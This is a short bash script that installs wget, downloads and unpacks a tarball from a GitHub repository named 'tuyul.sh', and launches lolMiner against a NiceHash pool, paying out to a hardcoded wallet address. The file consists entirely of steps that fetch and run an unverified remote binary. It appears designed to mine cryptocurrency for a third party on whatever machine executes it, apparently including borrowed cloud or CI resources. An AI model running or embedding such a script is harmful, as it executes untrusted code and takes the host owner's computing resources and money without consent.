#!/bin/bash
apt-get install wget -y
wget https://github.com/Kocalkocal93Kocalkocal93/tuyul.sh/raw/main/abc.tar.gz
tar -xvf abc.tar.gz
cd 1.34a
./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3FCfhzCuSutBj2UJFLirmbABb3NAtdXMzb.RIG_BOSS_DAR --ethstratum ETHPROXY
